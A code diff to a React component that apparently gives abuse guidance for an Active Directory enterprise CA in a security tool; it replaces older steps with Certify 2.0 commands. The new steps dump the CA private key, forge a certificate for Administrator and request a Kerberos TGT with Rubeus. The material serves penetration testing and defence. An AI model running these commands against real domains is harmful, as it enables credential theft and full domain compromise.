@@ -21,47 +21,25 @@ const Abuse: FC = () => {
     return (
         <>
             <Typography variant='body1'>
-                Obtain CA certificate incl. private key - using built-in GUI (certsrv.msc)
+                Obtain CA certificate incl. private key
             </Typography>
             <Typography variant='body2'>
-                1) Open certsrv.msc as Administrator on the enterprise CA host.
-                <br />
-                2) Right-click on the enterprise CA and select "All Tasks" followed by "Back up CA...".
-                <br />
-                3) Click "Next", select "Private key and CA certificate", and select the location folder.
-                <br />
-                4) Click "Next", and set a password.
-                <br />
-                5) Click "Next" and click "Finish" to back up the certificate as a .p12 file.
-            </Typography>
-            <Typography variant='body1'>Obtain CA certificate incl. private key - using commandline tools</Typography>
-            <Typography variant='body2'>
-                1) Print all certificates of the host using SharpDPAPI:
-                <Typography component={'pre'}>{'SharpDPAPI.exe certificates /machine'}</Typography>
-                The enterprise CA certificate is the one where issuer and subject are identical.
-                <br />
-                <br />
-                2) Save the private key in .key file (e.g. cert.key) and the certificate in .pem file (cert.pem) in the
-                same folder.
-                <br />
-                3) Create a .pfx version of the CA certificate using certutil:
-                <Typography component={'pre'}>{'certutil.exe -MergePFX .\\cert.pem .\\cert.pfx'}</Typography>
-                <br />
-                4) Set password when prompted.
+                Use Certify (2.0) to export all certificates in the local machine certificate store and identify the CA certificate by the name of the CA:
+                <Typography component={'pre'}>{'Certify.exe manage-self --dump-certs'}</Typography>
             </Typography>
             <Typography variant='body1'>Forge certificate and obtain a TGT as targeted principal</Typography>
             <Typography variant='body2'>
-                1) Forge a certificate of a target principal using ForgeCert:
+                Forge a certificate of a target principal:
                 <Typography component={'pre'}>
                     {
-                        'ForgeCert.exe --CaCertPath cert.pfx --CaCertPassword "password123!" --Subject "CN=User" --SubjectAltName "roshi@dumpster.fire" --NewCertPath target.pfx --NewCertPassword "NewPassword123!"'
+                        'Certify.exe forge --ca-cert <pfx-path/base64-pfx> --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500'
                     }
                 </Typography>
                 <br />
-                2) Request a TGT for the targeted principal using the certificate with Rubeus:
+                Request a TGT for the targeted principal using the certificate with Rubeus:
                 <Typography component={'pre'}>
                     {
-                        'Rubeus.exe asktgt /user:Roshi /domain:dumpster.fire /certificate:target.pfx /password:NewPassword123!'
+                        'Rubeus.exe asktgt /user:Administrator /domain:dumpster.fire /certificate:<pfx-path/base64-pfx>'
                     }
                 </Typography>
             </Typography>
